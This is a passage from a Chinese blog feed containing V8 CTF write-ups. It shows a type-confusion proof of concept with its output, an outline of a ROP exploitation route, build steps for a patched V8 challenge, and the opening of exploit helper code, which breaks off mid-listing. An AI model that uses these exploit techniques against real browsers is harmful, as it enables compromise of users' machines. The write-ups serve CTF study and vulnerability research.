href="https://ssd-disclosure.com/archives/3379" target="_blank" rel="noopener">这个漏洞</a>，很有趣。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">JSNativeContextSpecialization::ReduceElementAccess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  ...</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="comment">// Perform map check on the &#123;receiver&#125;.</span></span></span></span><br><span class="line"><span class="function"><span class="params">    access_builder.BuildCheckMaps(receiver, &amp;effect, control,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  access_info.receiver_maps());</span></span></span><br><span class="line"><span class="function"><span class="params">...</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">void</span> PropertyAccessBuilder::BuildCheckMaps(</span></span></span><br><span class="line"><span class="function"><span class="params">    Node* receiver, Node** effect, Node* control,</span></span></span><br><span class="line"><span class="function"><span class="params">    ZoneVector&lt;Handle&lt;Map&gt;&gt; <span class="keyword">const</span>&amp; receiver_maps) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">  HeapObjectMatcher m(receiver);</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">if</span> (m.HasValue()) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">    MapRef receiver_map = m.Ref(broker()).<span class="built_in">map</span>();</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">if</span> (receiver_map.is_stable()) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">for</span> (Handle&lt;Map&gt; <span class="built_in">map</span> : receiver_maps) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">if</span> (MapRef(broker(), <span class="built_in">map</span>).equals(receiver_map)) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">          dependencies()-&gt;DependOnStableMap(receiver_map);</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">return</span>;</span></span></span><br><span class="line"><span class="function"><span class="params">        &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">      &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">    &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">  &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">  ZoneHandleSet&lt;Map&gt; maps;</span></span></span><br><span class="line"><span class="function"><span class="params">  CheckMapsFlags flags = CheckMapsFlag::kNone;</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">for</span> (Handle&lt;Map&gt; <span class="built_in">map</span> : receiver_maps) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">    MapRef receiver_map(broker(), <span class="built_in">map</span>);</span></span></span><br><span class="line"><span class="function"><span class="params">    maps.insert(receiver_map.object(), graph()-&gt;zone());</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">if</span> (receiver_map.is_migration_target()) &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">      flags |= CheckMapsFlag::kTryMigrateInstance;</span></span></span><br><span class="line"><span class="function"><span class="params">    &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">  &#125;</span></span></span><br><span class="line"><span class="function"><span class="params">  *effect = graph()-&gt;NewNode(simplified()-&gt;CheckMaps(flags, maps), receiver,</span></span></span><br><span class="line"><span class="function"><span class="params">                             *effect, control);</span></span></span><br><span class="line"><span class="function"><span class="params">&#125;</span></span></span><br></pre></td></tr></table></figure><p>而这个patch就是把install compile dependency的代码给禁用了，所以如果我们使用一个stable map的arr，将不会有任何的类型检查，于是就有了一个type confusion。</p><h3 id="IR分析-1"><a href="#IR分析-1" class="headerlink" title="IR分析"></a>IR分析</h3><h4 id="case1"><a href="#case1" class="headerlink" title="case1"></a>case1</h4><p>非stable map<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-17-072849.jpg" alt=""></p><h4 id="case2"><a href="#case2" class="headerlink" title="case2"></a>case2</h4><p>stable map<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-17-072916.jpg" alt=""></p><p>所以给出poc如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line"><span class="comment">// make the map stable</span></span><br><span class="line">arr.x = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">idx</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arr[idx];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// optimize foo</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)&#123;</span><br><span class="line">    foo(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// change arr to dictionary map</span></span><br><span class="line">arr[<span class="number">0x100000</span>] = <span class="number">5.5</span>;</span><br><span class="line"><span class="built_in">console</span>.log(foo(<span class="number">1000</span>));</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">sakura@sakuradeMacBook-Pro:~<span class="regexp">/Desktop/</span>v8/v8/out/gn$ ./d8 poc.js</span><br><span class="line"><span class="number">-1.1885946300594787e+148</span></span><br></pre></td></tr></table></figure><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>stephen给出了一种非常精巧的漏洞利用方法，而不是使用wasm rwx内存，实际上这个迟早要被禁用。<br>通过poc我们很容易就可以得到任意地址读写的原语。<br>为了构建rop链，我们可以使用如下的方法，来自stephen，非常感谢。</p><ol><li>leak a binary pointer from the heap</li><li>read pointer to kernel32 from IAT</li><li>read kernelbase pointer from IAT of kernel32</li><li>There’s a stack pointer stored in a struct at KERNELBASE!BasepCurrentTopLevelFilter+8</li><li>ROP</li></ol><p>另外如果challenge只给了v8 binary，而是给了一个chromium的话，也可以参考我博客上关于bug-906043的漏洞利用。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;qwb-growupjs-amp-wctf-independence-day-writeup&quot;&gt;&lt;a href=&quot;#qwb-growupjs-amp-wctf-independence-day-writeup&quot; class=&quot;headerlink&quot; title=&quot;
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>34c3 v9 writeup</title>
    <link href="http://eternalsakura13.com/2019/04/29/v9/"/>
    <id>http://eternalsakura13.com/2019/04/29/v9/</id>
    <published>2019-04-29T05:40:51.569Z</published>
    <updated>2019-04-29T05:50:30.926Z</updated>
    
    <content type="html"><![CDATA[<h1 id="34c3-v9-writeup"><a href="#34c3-v9-writeup" class="headerlink" title="34c3 v9 writeup"></a>34c3 v9 writeup</h1><p>很久之前做的了，和*CTF那题差不多，顺便就发出来。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://github.com/saelo/v9" target="_blank" rel="noopener">https://github.com/saelo/v9</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir v9 &amp;&amp; cd v9</span><br><span class="line">fetch v8 &amp;&amp; cd v8           # see https:&#x2F;&#x2F;github.com&#x2F;v8&#x2F;v8&#x2F;wiki&#x2F;Building-from-Source</span><br><span class="line">git checkout 6.3.292.48</span><br><span class="line">gclient sync</span><br><span class="line">patch -p1 &lt; &#x2F;path&#x2F;to&#x2F;v9.patch</span><br><span class="line">.&#x2F;tools&#x2F;dev&#x2F;v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn&#x2F;x64.debug</span><br></pre></td></tr></table></figure><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><h3 id="工具类准备"><a href="#工具类准备" class="headerlink" title="工具类准备"></a>工具类准备</h3><p>这部分就是一些可复用的代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.padLeft =</span><br><span class="line"><span class="built_in">Number</span>.prototype.padLeft = <span class="function"><span class="keyword">function</span>(<span class="params">total, pad</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="built_in">Array</span>(total).join(pad || <span class="number">0</span>) + <span class="keyword">this</span>).slice(-total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return the hexadecimal representation of the given byte array.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexlify</span>(<span class="params">bytes</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> res = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span><br><span class="line">        <span class="comment">//print(bytes[i].toString(16));</span></span><br><span class="line">        res.push((<span class="string">'0'</span> + bytes[i].toString(<span class="number">16</span>)).substr(<span class="number">-2</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.join(<span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Return the binary data represented by the given hexdecimal string.</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unhexlify</span>(<span class="params">hexstr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hexstr.length % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Invalid hex string"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(hexstr.length / <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; hexstr.length; i += <span class="number">2</span>)</span><br><span class="line">        bytes[i/<span class="number">2</span>] = <span class="built_in">parseInt</span>(hexstr.substr(i, <span class="number">2</span>), <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexdump</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> data.BYTES_PER_ELEMENT !== <span class="string">'undefined'</span>)</span><br><span class="line">        data = <span class="built_in">Array</span>.from(data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> lines = [];</span><br><span class="line">        <span class="keyword">var</span> chunk = data.slice(i, i+<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i += <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> parts = chunk.map(hex);</span><br><span class="line">        <span class="keyword">if</span> (parts.length &gt; <span class="number">8</span>)</span><br><span class="line">            parts.splice(<span class="number">8</span>, <span class="number">0</span>, <span class="string">' '</span>);</span><br><span class="line">        lines.push(parts.join(<span class="string">' '</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lines.join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simplified version of the similarly named python module.</span></span><br><span class="line"><span class="keyword">var</span> Struct = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Allocate these once to avoid unecessary heap allocations during pack/unpack operations.</span></span><br><span class="line">    <span class="keyword">var</span> buffer      = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">var</span> byteView    = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer);</span><br><span class="line">    <span class="keyword">var</span> uint32View  = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer);</span><br><span class="line">    <span class="keyword">var</span> float64View = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        pack: <span class="function"><span class="keyword">function</span>(<span class="params">type, value</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> view = type;        <span class="comment">// See below</span></span><br><span class="line">            view[<span class="number">0</span>] = value;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer, <span class="number">0</span>, type.BYTES_PER_ELEMENT);</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        unpack: <span class="function"><span class="keyword">function</span>(<span class="params">type, bytes</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (bytes.length !== type.BYTES_PER_ELEMENT)</span><br><span class="line">                <span class="keyword">throw</span> <span class="built_in">Error</span>(<span class="string">"Invalid bytearray"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> view = type;        <span class="comment">// See below</span></span><br><span class="line">            byteView.set(bytes);</span><br><span class="line">            <span class="keyword">return</span> view[<span class="number">0</span>];</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Available types.</span></span><br><span class="line">        int8:    byteView,</span><br><span class="line">        int32:   uint32View,</span><br><span class="line">        float64: float64View</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Int64</span>(<span class="params">v</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// The underlying byte array.</span></span><br><span class="line">    <span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (<span class="keyword">typeof</span> v) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'number'</span>:</span><br><span class="line">            v = <span class="string">'0x'</span> + <span class="built_in">Math</span>.floor(v).toString(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'string'</span>:</span><br><span class="line">            <span class="keyword">if</span> (v.startsWith(<span class="string">'0x'</span>))</span><br><span class="line">                v = v.substr(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> (v.length % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">                v = <span class="string">'0'</span> + v;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> bigEndian = unhexlify(v, <span class="number">8</span>);</span><br><span class="line">            <span class="comment">//print(bigEndian.toString());</span></span><br><span class="line">            bytes.set(<span class="built_in">Array</span>.from(bigEndian).reverse());</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'object'</span>:</span><br><span class="line">            <span class="keyword">if</span> (v <span class="keyword">instanceof</span> Int64) &#123;</span><br><span class="line">                bytes.set(v.bytes());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (v.length != <span class="number">8</span>)</span><br><span class="line">                    <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">"Array must have excactly 8 elements."</span>);</span><br><span class="line">                bytes.set(v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'undefined'</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">"Int64 constructor requires an argument."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return a double whith the same underlying bit representation.</span></span><br><span class="line">    <span class="keyword">this</span>.asDouble = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// Check for NaN</span></span><br><span class="line">        <span class="keyword">if</span> (bytes[<span class="number">7</span>] == <span class="number">0xff</span> &amp;&amp; (bytes[<span class="number">6</span>] == <span class="number">0xff</span> || bytes[<span class="number">6</span>] == <span class="number">0xfe</span>))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RangeError</span>(<span class="string">"Integer can not be represented by a double"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Struct.unpack(Struct.float64, bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return a javascript value with the same underlying bit representation.</span></span><br><span class="line">    <span class="comment">// This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)</span></span><br><span class="line">    <span class="comment">// due to double conversion constraints.</span></span><br><span class="line">    <span class="keyword">this</span>.asJSValue = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((bytes[<span class="number">7</span>] == <span class="number">0</span> &amp;&amp; bytes[<span class="number">6</span>] == <span class="number">0</span>) || (bytes[<span class="number">7</span>] == <span class="number">0xff</span> &amp;&amp; bytes[<span class="number">6</span>] == <span class="number">0xff</span>))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RangeError</span>(<span class="string">"Integer can not be represented by a JSValue"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.</span></span><br><span class="line">        <span class="keyword">this</span>.assignSub(<span class="keyword">this</span>, <span class="number">0x1000000000000</span>);</span><br><span class="line">        <span class="keyword">var</span> res = Struct.unpack(Struct.float64, bytes);</span><br><span class="line">        <span class="keyword">this</span>.assignAdd(<span class="keyword">this</span>, <span class="number">0x1000000000000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return the underlying bytes of this number as array.</span></span><br><span class="line">    <span class="keyword">this</span>.bytes = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Array</span>.from(bytes);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return the byte at the given index.</span></span><br><span class="line">    <span class="keyword">this</span>.byteAt = <span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> bytes[i];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Return the value of this number as unsigned hex string.</span></span><br><span class="line">    <span class="keyword">this</span>.toString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//print("toString");</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'0x'</span> + hexlify(<span class="built_in">Array</span>.from(bytes).reverse());</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Basic arithmetic.</span></span><br><span class="line">    <span class="comment">// These functions assign the result of the computation to their 'this' object.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decorator for Int64 instance operations. Takes care</span></span><br><span class="line">    <span class="comment">// of converting arguments to Int64 instances if required.</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">operation</span>(<span class="params">f, nargs</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">arguments</span>.length != nargs)</span><br><span class="line">                <span class="keyword">throw</span> <span class="built_in">Error</span>(<span class="string">"Not enough arguments for function "</span> + f.name);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++)</span><br><span class="line">                <span class="keyword">if</span> (!(<span class="built_in">arguments</span>[i] <span class="keyword">instanceof</span> Int64))</span><br><span class="line">                    <span class="built_in">arguments</span>[i] = <span class="keyword">new</span> Int64(<span class="built_in">arguments</span>[i]);</span><br><span class="line">            <span class="keyword">return</span> f.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">    